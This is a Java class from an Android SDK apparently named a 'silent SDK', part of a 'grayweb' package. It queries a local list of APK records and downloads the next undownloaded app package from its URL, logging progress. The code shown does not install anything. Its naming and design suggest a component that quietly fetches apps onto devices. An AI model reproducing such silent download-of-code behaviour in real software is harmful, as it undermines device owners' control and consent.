package sdk.grayweb.com.slientsdk.action;

import android.content.Context;
import android.util.Log;


import java.sql.SQLException;
import java.util.List;

import sdk.grayweb.com.slientsdk.http.FileDownloader;
import sdk.grayweb.com.slientsdk.model.ApkModel;
import sdk.grayweb.com.slientsdk.util.DivesUtil;
import sdk.grayweb.com.slientsdk.util.DownLoadUtil;

/**
 * Created by engine on 16/5/11.
 */
public class DownloadAction extends AbstractAction {
    private FileDownloader mFileDownloader;

    public DownloadAction(Context context) {
        super(context);
        mFileDownloader = new FileDownloader(1);
    }

    @Override
    public int doAction() {
        try {
            List<ApkModel> downloadApks = apkModelDao.queryBuilder().orderBy("level", false).where().eq("status",1).query();
            for (ApkModel model : downloadApks) {
                if (!DownLoadUtil.hasDown(model.apkpath)) {
                    doDown(model.apkpath);
                    break;
                }
            }
            return downloadApks.size();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return -1;
    }

    private void doDown(String url) {
        FileDownloader.Listener listener = mFileDownloader.new Listener() {
            @Override
            public void onStart() {
                // download start
                Log.e(TAG, "download start");
            }

            public void onFinish() {
                // download finish
                Log.e(TAG, "download finish");
            }

            public void onError(String msg) {
                // download error
                Log.e(TAG, "download error");
            }

            public void onProgressChange(long fileSize, long downloadedSize) {
                // download progress change
                Log.e(TAG, "download progress fileSize=" + fileSize + ",downloadedSize=" + downloadedSize);
            }
        };
        mFileDownloader.add(DownLoadUtil.getFileNameByUrl(url), url, listener);
    }


}
